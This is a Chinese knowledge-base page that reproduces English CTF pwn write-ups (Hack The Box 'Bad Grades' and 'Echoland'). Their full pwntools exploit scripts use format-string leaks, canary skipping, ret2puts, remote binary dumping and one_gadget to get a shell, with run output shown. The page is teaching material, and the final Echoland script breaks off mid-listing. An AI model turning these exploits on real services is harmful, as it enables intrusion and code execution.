---
title: 格式化字符串、地址泄漏与保护绕过
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/format/
categories:
- 二进制安全
- 格式化字符串
tags:
- 知识库
- 格式化字符串
- ret2libc
- Canary
- 信息泄漏
- PIE
- libc
- 字节序
description: 格式化字符串可以泄漏栈数据、恢复程序或构造写入原语，但每个目标的参数位置和保护组合不同。本章保留 PIE、Canary、ASLR 与 libc 的逐层确认过程，代码和运行输出可以互相对照。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

格式化字符串可以泄漏栈数据、恢复程序或构造写入原语，但每个目标的参数位置和保护组合不同。本章保留 PIE、Canary、ASLR 与 libc 的逐层确认过程，代码和运行输出可以互相对照。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/format/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Echoland 从网络接口恢复 ELF，原脚本包含错误地址与崩溃处理。

Bad Grades 的浮点输入与 What Does the F Say 的 canary 泄漏分别形成不同绕过路线。

Format 保留两套分析，Racecar 则展示字长与小端重组对结果的影响。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [浮点输入中的 canary 绕过](#case-bad-grades) | bad-grades | 格式化字符串、Canary、ret2libc |
| [盲格式化字符串与二进制恢复](#case-echoland) | echoland | 格式化字符串、信息泄漏、ret2libc |
| [PIE 泄漏与格式化写入](#case-format) | format | 格式化字符串、PIE、libc |
| [栈数据与小端重组](#case-racecar) | racecar | 格式化字符串、字节序、信息泄漏 |
| [PIE、Canary 与 libc 的分层泄漏](#case-what-dose-the-f-say) | what-dose-the-f-say | 格式化字符串、Canary、PIE、ret2libc |

<a id="case-bad-grades"></a>

## 浮点输入中的 canary 绕过

scanf 的浮点输入行为允许跳过指定槽位。原记录将它与返回地址的 double 编码、ret2puts 泄漏及第二阶段调用结合，并保留完整脚本。

<p class="kb-provenance">来源 bad-grades · 原记录 2021-09-01 · 5 个代码块 · 14 处图片引用</p>

<details class="kb-evidence" id="record-bad-grades">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start bad-grades -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]
└─# file bad_grades 
bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]
└─# checksec bad_grades
[*] '/root/hackthebox/challenge/pwn/Bad_grades/bad_grades'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



#### 2. Spot the first vulnerability — buffer overflow:

The first vulnerability lies in the total grades counter buffer, which could be overflowed with more than 33 Bytes.

Make a loop that will add 34 grades to the grade pool.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades.jpg)

Spot the stack smashing — potential buffer overflow.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades1.jpg)

#### 3. Spot the second vulnerability — format string:

Since there is a stack canary in use, it will be impossible to exploit a buffer overflow, without leaking somehow stack canary value, brute-forcing it, or somehow skipping this value while overflowing the rest of the stack data.

The binary is stripped, but the overflowed function can be spotted with ease using static binary analysis with a disassembler.

It shows the information about the data type (%lf for double) that will be stored in memory.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades2.jpg)

You can use . (dot character) to skip writing data in a referenced variable if the user input is collected with scanf("%lf", &grade[i])

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades3.jpg)

#### 4. Join two vulnerabilities and skip the stack canary:

Since stack cookie is just before return address, you can skip writing to canary and overwrite the RSP register, thus controlling execution flow.

One thing to mention, there is a (35) RBP register between (34) stack canary and (36) RSP register.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades4.jpg)

The last problem is the type of the variable set by scanf(“%lf”, &grade[i]) which is double . That means during overflow, the return address will be overwritten not by for example 65 but 65.0 .

Doubles are stored in memory differently, you can learn how to convert double to binary [here](https://www.log2base2.com/storage/how-float-values-are-stored-in-memory.html).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades5.jpg)

There are three steps in Python2 in order to convert your desire pointer value to the double representation

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades6.jpg)

``` python
def double_pointer(pointer_value):
    '''Convert x64 pointer to double representation'''
    byte_string = p64(pointer_value)
    hex_byte_string = binascii.hexlify(byte_string)
    return struct.unpack('d', hex_byte_string.decode('hex'))[0]
```

Armed with the above script you are ready to overwrite the RSP address.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades7.jpg)

The RSP below successfully returns to the printf()

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades8.jpg)

#### 5. Bypass ASLR with ret2puts:

First, the PLT address of puts() will be needed with the corresponding GOT address to be leaked.

Since this is an x64 architecture it will be needed a ROP gadget to set up the GOT address of puts in the RDI register, so it could be used by puts().

Additionally, main() address will be needed for returning to vulnerable function and overflow it again with the calculated address of one_gadget.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades9.jpg)

Set the grade_counter to 39 — since now additional values will be stored on the stack.

Send the payload in correct order, to leak GOT entry with puts()

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades10.jpg)

Run it against the remote target to check if it works.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades11.jpg)

#### 6. Connect all the dots and get the shell:

Calculate the [one_gadget](https://karol-mazurek95.medium.com/pwn-restaurant-challenge-htb-2287a1f83cf4) with leaked puts using relative addressing.
(puts address is further than execve() relative it is 0x80aa0–0x4f432 )

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]
└─# one_gadget libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]
└─# objdump -TR libc.so.6 | grep puts
0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts
0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts
0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent
0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent
000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs
000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs
000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked
```

Overflow it again with calculated one_gadget

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades12.jpg)

#### 7. Final exploit:

``` python
from pwn import *
import struct
import time

context.log_level = "info"
libc = ELF("libc.so.6")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

rop = ROP("bad_grades")
elf = ELF("bad_grades")
p = remote("138.68.155.238", 30565)

#p = process("./bad_grades")
#gdb.attach(p,''' b * 0x4010ec
#c
#''')
# Detecting overflow ---
def first_vul():
    p.sendline("2")
    p.recv()
    p.sendline("34")
    p.recv()
    for i in range(0,34):
        p.sendline("1")
        print(p.recv())

# ---
# Set the address variables ---
puts_got = elf.got["puts"]
log.success("GOT puts address: {}".format(hex(puts_got)))
puts_plt = elf.plt["puts"]
log.success("PLT puts address: {}".format(hex(puts_plt)))
pop_rdi = rop.find_gadget(["pop rdi"])[0]
log.success("POP RDI gadget address: {}".format(hex(pop_rdi)))
main_addr = 0x00401108
log.success("Main address: {}".format(hex(main_addr)))

# ---
def fill_the_buffer(grades_count):
    ''' Set the stack pointer at the 34th Byte'''
    p.sendline("2")
    p.recv()
    p.sendline("{}".format(grades_count))
    p.recv()
    for i in range(0,33): 
        p.sendline("1")
        p.recv()
    
    p.sendline(".") # pass canary
    p.recv()
    p.sendline(".") # pass RBP
    p.recv()

def double_pointer(pointer_value):
    '''Convert x64 pointer to double representation'''
    byte_string = p64(pointer_value)
    hex_byte_string = binascii.hexlify(byte_string)
    return struct.unpack('d', hex_byte_string.decode('hex'))[0]

# Jump over stack canary and frame pointer & leak puts address ---
fill_the_buffer(39)
p.sendline("{}".format(double_pointer(pop_rdi)))
print(p.recv())
p.sendline("{}".format(double_pointer(puts_got)))
print(p.recv())
p.sendline("{}".format(double_pointer(puts_plt)))
print(p.recv())
p.sendline("{}".format(double_pointer(main_addr)))
p.recvline() # leak data to first 0x0a char
leak = p.recvline() # leak another line with puts address 
print("[+] leak another line with puts address:", leak)
time.sleep(1)
leaked_puts = u64(leak.strip().ljust(8,"\x00"))
log.critical("Leaked puts address: {}".format(leaked_puts))

# ---
# Overflow again with calculated one gadget ---
one_gadget = leaked_puts - libc.symbols["puts"] + 0x4f432
fill_the_buffer(36)
p.sendline("{}".format(double_pointer(one_gadget))) 
print(p.recv())

p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]
└─# python getshell.py                                                                                               
[*] '/root/hackthebox/challenge/pwn/Bad_grades/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/root/hackthebox/challenge/pwn/Bad_grades/bad_grades'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for 'bad_grades'
[+] Opening connection to 178.128.160.242 on port 30441: Done
[+] GOT puts address: 0x601fa8
[+] PLT puts address: 0x400680
[+] POP RDI gadget address: 0x401263
[+] Main address: 0x401108
Grade [36]: 
Grade [37]: 
Grade [38]: 
('[+] leak another line with puts address:', '\xa0Zy/\xc1\x7f\n')
[CRITICAL] Leaked puts address: 140467701897888
Grade [36]: 
[*] Switching to interactive mode
Your new average is: 134990801633253939234528747106260167272288995420515641120614684084693692875892821619221009832982853632238658860567790589577833938316859881291776.00
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
bad_grades
flag.txt
libc.so.6
run_challenge.sh
$ cat flag.txt
HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades13.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Bad grades challenge - HTB](https://karol-mazurek95.medium.com/pwn-bad-grades-challenge-htb-e747bda5e446)
<!-- kb:end bad-grades -->

</details>

<a id="case-echoland"></a>

## 盲格式化字符串与二进制恢复

仅有网络接口时，通过指针、ELF magic 和内存读取恢复程序，再确定 libc 与溢出位置。错误地址导致的崩溃处理也保留在脚本中。

<p class="kb-provenance">来源 echoland · 原记录 2021-12-11 · 23 个代码块 · 12 处图片引用</p>

<details class="kb-evidence" id="record-echoland">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start echoland -->

#### 详细过程及exp
#### 0. Connect to the binary:

The only information provided with this challenge was an IP address and port number.
You can connect to the binary using for example netcat as below:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# nc 138.68.136.191 32714

🦇 Inside the dark cave. 🦇
1. Scream.
2. Run outside.
> HELLO
HELLO

1. Scream.
2. Run outside.
> asd
asd
```

Typing HELLO or asd resulting in the same value echoed back.
Another option is to (1) Scream...

``` bash
1. Scream.
2. Run outside.
> 1
>> AAAAAAA
Your friend did not recognize you and ran the other way!
```



... but nobody will hear you :)

The last option is to (2) Run outside. but it looks like an [infinite loop](https://cwe.mitre.org/data/definitions/835.html).

``` bash
🦇 Inside the dark cave. 🦇
1. Scream.
2. Run outside.
> 2
2

1. Scream.
2. Run outside.
> 2
2

1. Scream.
2. Run outside.
> 2
2
```

#### 1. Spot the first vulnerability — Format String:

Simple check with %p as an input leaked some data from the stack and %s crashed the binary.

``` bash
1. Scream.
2. Run outside.
> %p--%p--%p
0x6e--0xfffffff4--0x10

1. Scream.
2. Run outside.
> %s
/home/ctf/run_challenge.sh: line 2:    31 Segmentation fault      ./echoland
```

You can use Format String vulnerability to your advantage and leak the pointers from binary using %p to get a general overview of the application.

 - dumpbinary.py

``` bash
from pwn import *
from struct import *
#-*- coding: utf-8 -*-

context.log_level = 'error'
context.update(arch = 'amd64', os = 'linux')
ip, port = "138.68.136.191:32714".split(":")

def leak_pointers_from_stack(ip,port):
    '''Format string - leak pointers to get the libc/main address and architecture.'''
    for i in range(0,20):
        try:
            p = remote(ip,port)
            p.sendline("%{}$p".format(i).encode())
            sleep(0.2)
            leak = p.recv()
            x =str(i) + " : " + leak.decode().split(">")[1].split("\x0a\x0a")[0]
            print(x)
            p.close()
        except:
            p.close()
            pass

leak_pointers_from_stack(ip,port)
```

As you can see below, on the target machine there is x64 architecture, ASLR being on, we can leak pointer to the main module at the 12th offset and pointer from libc at the 13th position:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 dumpbinary.py
0 :  %0$p
1 :  0x6e
2 :  0xfffffff4
3 :  0x10
4 :  0x1d
5 :  0x7f2fa48984c0
6 :  0x7ffd57971488
7 :  0x100000000
8 :  0xa70243825
9 :  (nil)
10 :  0x7fff00000000
11 :  0x100000000
12 :  0x561b128fa400
13 :  0x7f73669d5bf7
14 :  0x1
15 :  0x7ffdd033d9c8
16 :  0x100008000
17 :  0x5555abc312ef
18 :  (nil)
19 :  0xe5eeacab581ae7b3
```

#### 2. Blind Format String — finding magic bytes:

In order to dump binary code, you have to first find any pointer from the main module and it was shown above.

Then you have to automatically grab this pointer for further exploitation using the below function which returns leaked main address — thus bypassing ASLR:

``` bash
def leak_pointer_to_main():
    '''12th pointer is one from the main()'''
    p.sendline(b"%12$p")
    sleep(1)
    p.recvuntil(b"> ")
    leak_all = p.recv()
    leak = leak_all.decode().split("\n")[0]
    print("Leaked main address: " + leak)
    return int(leak,16)
```

Then you have to subtract some bytes till you find [ELF magic bytes](https://unix.stackexchange.com/questions/153352/what-is-elf-magic).

This is an important step, because you should dump the binary from the ELF header segment.

``` bash
def search_elf_magic_bytes(leaked_main,addr):
    '''Search through the process memory to find ELF magic bytes: \x7fELF.'''
    while True:
        leak_part = b"%9$sEOF" + b"\x00"
        try:
            p.sendline(leak_part + p64(leaked_main + addr))
            resp = p.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
            leak = resp.split(b"EOF")[0] + b"\x00"
            print("Deferenced pointer: " + leak.decode("unicode_escape"))
            if b"\x7FELF" in leak:
                magic_bytes = leaked_main + addr
                print("MAGIC BYTES FOUND @: " + hex(magic_bytes))
                return magic_bytes, False
                break
            addr -=0x100
        except:
            addr -=0x100
            p.close()
            return addr, True
# Find ELF magic bytes => start_main_address
elf_found=True
addr = 0
leaked_main = 0
while elf_found:
    p = remote(ip,port)
    print("CURRENT ADDRESS = " + hex(addr))
    leaked_main = leak_pointer_to_main() + addr
    addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
start_main_addr = addr
```

The above function search_elf_magic_bytes is very simple:

1. It connects to the target binary at line 62 until it does not find ELF magic bytes while elf_found — 61st line.
2. It executes the function leak_pointer_to_main() at line 64 and adds addr variables to the returned by the function address of main.
3. This addr variable is returned by the search_elf_magic_bytes and it is being decremented by 0x100 until it finds ELF magic bytes, then it will return the calculated pointer to those bytes.
4. search_elf_magic_bytes handles exceptions, because during pointer deference using %s at line 42 there is a big chance of a Segmentation fault because not every location points to a valid string array.
5. There is a nice trick at line 45 if you are using Python 3 and working with bytes, to decode those bytes using “unicode_escape” . Usually, it will give better results than “ASCII” or “UTF-8” .

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 dumpbinary.py
CURRENT ADDRESS = 0x0
Leaked main address: 0x556120bbf400
Deferenced pointer: ó\x0fúAWL=k)\x00
Deferenced pointer: uÐèYÿÿÿÇEü\x00
Deferenced pointer: ó\x0fú=\x1d\x00
Deferenced pointer: ó\x0fúòÿ%.\x00
Deferenced pointer: ó\x0fúHH\x05\x99/\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: ð?\x00
Deferenced pointer: ble\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x04
Deferenced pointer: \x00
Deferenced pointer: \x7fELF\x00
MAGIC BYTES FOUND @: 0x556120bbe000
```

As you can see above, magic bytes were found and from this point, you can begin leaking bytes to re-create the binary on your machine.

#### 3. Blind Format String — dumping the binary:

By leaking the pointer address to the ELF header you can actually dump the binary code and then decompile it using Ghidra/IDA/Binary ninja or any other RE tool that you like.

``` bash
def dump_binary(magic_bytes_addr):
    '''Dump the binary data'''
    base = magic_bytes_addr
    leak,leaked = bytearray(),bytearray()
    offset = len(leaked)
    while offset <= 0x5000:
        with open("leak.bin", "ab") as l:
            addr = p64(base + len(leaked))
            leak_part = b"%9$sEOF\x00"
            p.sendline(leak_part + addr)
            resp = p.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
            leak = resp.split(b"EOF")[0] + b"\x00"
            leaked.extend(leak)
            print("Address: " + hex(unpack("<Q",addr.ljust(8,b"\x00"))[0]) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape"))
            l.write(leak)
            l.flush()
            offset = len(leaked)

# Dump binary:
dump_binary(start_main_addr)
```

Using pointer deference at line 77 and proper stack alignment at line 78 dump raw bytes of remote binary to your machine.

The whole binary got the length of 0x5000 bytes, that is why while loop count to 0x5000 at line 74.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 dumpbinary.py
CURRENT ADDRESS = 0x0
Leaked main address: 0x55edf90c8400
Deferenced pointer: ó\x0fúAWL=k)\x00
Deferenced pointer: uÐèYÿÿÿÇEü\x00
Deferenced pointer: ó\x0fú=\x1d\x00
Deferenced pointer: ó\x0fúòÿ%.\x00
Deferenced pointer: ó\x0fúHH\x05\x99/\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: ð?\x00
Deferenced pointer: ble\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x04
Deferenced pointer: \x00
Deferenced pointer: \x7fELF\x00
MAGIC BYTES FOUND @: 0x55edf90c7000
Address: 0x55edf90c7000 - Offset: 0:0x0 - Leaked data: \x7fELF\x00
Address: 0x55edf90c7008 - Offset: 8:0x8 - Leaked data: \x00
Address: 0x55edf90c7009 - Offset: 9:0x9 - Leaked data: \x00
Address: 0x55edf90c700a - Offset: 10:0xa - Leaked data: \x00
Address: 0x55edf90c700b - Offset: 11:0xb - Leaked data: \x00
Address: 0x55edf90c700c - Offset: 12:0xc - Leaked data: \x00
Address: 0x55edf90c700d - Offset: 13:0xd - Leaked data: \x00
Address: 0x55edf90c700e - Offset: 14:0xe - Leaked data: \x00
Address: 0x55edf90c700f - Offset: 15:0xf - Leaked data: \x00
Address: 0x55edf90c7010 - Offset: 16:0x10 - Leaked data: \x03
Address: 0x55edf90c7012 - Offset: 18:0x12 - Leaked data: >\x00
......
```

You can watch the dump file slowly growing using tail -f leak.bin | xxd command.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# tail -f leak.bin | xxd
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 6011 0000 0000 0000  ..>.....`.......
00000020: 4000 0000 0000 0000 883b 0000 0000 0000  @........;......
00000030: 0000 0000 4000 3800 0d00 4000 1f00 1e00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
```

Voilà, now you can use this leaked file to decompile it using Binary Ninja.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# file echoland
echoland: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fa1c1fe305a86450ba9c555e3932a3e5c2633a, for GNU/Linux 3.2.0, not stripped
```

#### 4. Reverse the leaked binary:

Open the leaked file using any decompiler on leak.bin for example, Binary Ninja and click on _start symbol (Ghidra couldn’t analyze this so well like Binary Ninja and this is not an advertisement ^^):

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland.jpg)

As you can see this is a typical main function loader and data_12ef should be the pointer to the main() (if you can’t see the screen below, click p ):

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland1.jpg)

When you double click on this address it will redirect you to another one, double click it again and you will see the main() :

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland2.jpg)

Now a bit of Reverse Engineering to get the printf@GOT and then deference it to get the last 3 bytes of printf function address, so you can get the idea of what libc version is being used on the target system.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland3.jpg)

Above you can see main() — this is the corresponding code to the “Welcome message” where you chose between two options and leak data using format string vulnerability.

At the offset 0000133c and the offset 000013ad you can see sub_1100 call.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland4.jpg)

This is the call you are looking for — printf@PLT and you can guess it because 1. it prints data at 0000133c 2. decompiled code is vulnerable to format string at line 000013ad .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland5.jpg)

Above you can see an example of a vulnerable C code from OWASP, can you see the similarities? :)

If yes, go on and double click on sub_1100() to get into the stub.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland6.jpg)

As you can see now if you double-click on data_3fa8 you should be redirected to the GOT table…

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland7.jpg)

... and indeed, here you are. 0003fa8 offset is the printf@GOT .

#### 5. Get the target libc:

The below function will calculate the proper address of printf@plt during runtime, it is just adding printf@GOT offset to the leaked before the address of ELF magic bytes, which are start_main_addr :

``` bash
# After reversing - 0x00003fa8
def leak_printf_got(start_main_addr):
    '''Leak printf@GOT - which is dynamically linked during runtime'''
    printf_GOT = 0x00003fa8
    printf_addr = start_main_addr + printf_GOT
    print("Leaked printf address: " + hex(printf_addr))
    leak_part = b"%9$sEOF\x00"
    p.sendline(leak_part + p64(printf_addr))
    resp = p.recv()#until(b"1. Scream.\n2. Run outside.\n> ")
    leak = resp.split(b"EOF")[0] + b"\x00"
    libc_printf = hex(u64(leak.ljust(8,b"\x00")))
    print("[!!!] Leaked libc printf : " + libc_printf)
    return int(libc_printf,16)

libc_printf = leak_printf_got(start_main_addr)
```

As you can see below, it works, you get the printf() from remote libc.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 dumpbinary.py
CURRENT ADDRESS = 0x0
Leaked main address: 0x55f8dd753400
Deferenced pointer: ó\x0fúAWL=k)\x00
Deferenced pointer: uÐèYÿÿÿÇEü\x00
Deferenced pointer: ó\x0fú=\x1d\x00
Deferenced pointer: ó\x0fúòÿ%.\x00
Deferenced pointer: ó\x0fúHH\x05\x99/\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: ð?\x00
Deferenced pointer: ble\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x04
Deferenced pointer: \x00
Deferenced pointer: \x7fELF\x00
MAGIC BYTES FOUND @: 0x55f8dd752000
Leaked printf address: 0x55f8dd755fa8
[!!!] Leaked libc printf : 0x7fe7f9a4bf70
```

Now use the last three bytes to query the libc database to check what version of libc is being used on the target system:

 - [libc database search](https://libc.blukat.me/)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland8.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland9.jpg)

As you can see above, there are 5 different libc to choose from I was sure, the target system was AMD so I picked 3rd one.

In the situation when you have more potentially valid libc to choose from, you can try to decompile more functions from dumped leak.bin and using %s leak their address during runtime, then you should get only one libc.

Click on this libc and download it. It will be used later to calculate the [one_gadget](https://github.com/david942j/one_gadget) address.

 - [libc6_2.27-3ubuntu1.4_amd64.so](https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.so)

#### 6. Spot the second vulnerability — buffer overflow:

The second vulnerability could be found for example by fuzzing the app.

Below is my quick and dirty Buffer overflow fuzzer which fuzz the first option with chars between 30–100 length:

``` bash
def fuzz_buffer_overflow(ip,port):
    '''Find the offset of RIP overflow'''
    for i in range(30,100):
        try:
            p = remote(ip,port)
            p.sendline(b"1")
            sleep(0.3)
            p.recv()
            print("FUZZING: " + str(i))
            p.sendline(cyclic(i))
            sleep(0.3)
            data = p.recv()
            print(data.decode("unicode_escape"))
            if b"Segmentation" in data:
                print("========================\nBuffer overflow found @: " + str(i) + "\n========================")
                break
            p.close()
        except:
            p.close()
            pass

fuzz_buffer_overflow(ip,port)
```

As you can see there is potential buffer overflow at offset 64:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 fuzzing.py
......
FUZZING: 63

1. Scream.
2. Run outside.
> >> Your friend did not recognize you and ran the other way!

FUZZING: 64

1. Scream.
2. Run outside.
> >> Your friend did not recognize you and ran the other way!
/home/ctf/run_challenge.sh: line 2:    95 Segmentation fault      ./echoland

========================
Buffer overflow found @: 64
========================
```

#### 7. Get the RCE — calculate one_gadget:

The last step to gain control over the target binary execution flow is to calculate the address of one_gadget.

First use one_gadget on the leaked binary:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# one_gadget libc6_2.27-3ubuntu1.4_amd64.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Always choose the address with fewer conditions that should be fulfilled.

In above example 0x4f3d5 offset is promising because it needs only one null byte at the rsp+0x40

You can actually overflow those bytes during Buffer Overflow, below was added 0x70 bytes after the one_gadget:

``` bash
def get_rce(libc_printf):
    printf_libc_offset = 0x0000000000064f70
    one_gadget = 0x4f432
    rce = libc_printf - printf_libc_offset + one_gadget
    print("CALCULATED RCE: " + hex(rce))
    p.sendline(b"1")
    p.recv()
    p.send(b"A"*64 +p64(0x0000000000064f70) + p64(rce) + b"\x00"*0x70)
    p.interactive()

get_rce(libc_printf)
```

The last thing to mention, 65–72 bytes are overflowing probably Frame Pointer and it has to be valid — it should be in the binary memory address space range.

73–80 bytes have to be overflowed with one_gadget — this is actually control over the instruction pointer.

Above, at line 139 I picked just a random low address (printf@GOT) but you could probably overflow this with the one_gadget.

final exp:

``` bash
from pwn import *
from struct import *
#-*- coding: utf-8 -*-

context.log_level = 'error'
context.update(arch = 'amd64', os = 'linux')
ip, port = "138.68.129.154:31898".split(":")

def leak_pointers_from_stack(ip,port):
    '''Format string - leak pointers to get the libc/main address and architecture.'''
    for i in range(0,20):
        try:
            p = remote(ip,port)
            p.sendline("%{}$p".format(i).encode())
            sleep(1)
            leak = p.recv()
            x = str(i) + " : " + leak.decode().split(">")[1].split("\x0a\x0a")[0]
            print(x)
            p.close()
        except:
            p.close()
            pass

# leak_pointers_from_stack(ip,port)
def leak_pointer_to_main():
    '''12th pointer is one from the main()'''
    p.sendline(b"%12$p")
    sleep(1)
    p.recvuntil(b"> ")
    leak_all = p.recv()
    leak = leak_all.decode().split("\n")[0]
    print("Leaked main address: " + leak)
    return int(leak,16)

def search_elf_magic_bytes(leaked_main,addr):
    '''Search through the process memory to find ELF magic bytes: \x7fELF.'''
    while True:
        leak_part = b"%9$sEOF" + b"\x00"
        try:
            p.sendline(leak_part + p64(leaked_main + addr))
            resp = p.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
            leak = resp.split(b"EOF")[0] + b"\x00"
            print("Deferenced pointer: " + leak.decode("unicode_escape"))
            if b"\x7FELF" in leak:
                magic_bytes = leaked_main + addr
                print("MAGIC BYTES FOUND @: " + hex(magic_bytes))
                return magic_bytes, False
                break
            addr -=0x100
        except:
            addr -=0x100
            p.close()
            return addr, True

# Find ELF magic bytes => start_main_address
